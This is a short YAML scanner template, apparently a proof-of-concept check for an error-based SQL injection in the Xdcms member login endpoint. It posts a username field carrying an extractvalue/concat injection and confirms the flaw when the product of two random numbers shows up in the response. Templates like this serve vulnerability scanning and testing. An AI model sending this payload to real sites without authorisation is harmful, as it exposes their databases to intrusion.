expression: r0()
id: xdcms-sql
info:
  author: amos1
  name: Xdcms sql
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      * r2)))
    request:
      body: 'username=dd'' or extractvalue(0x0a,concat(0x0a,{{r1}}*{{r2}}))#&password=dd&submit=+%B5%C7+%C2%BC+

        '
      method: POST
      path: /index.php?m=member&f=login_save
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
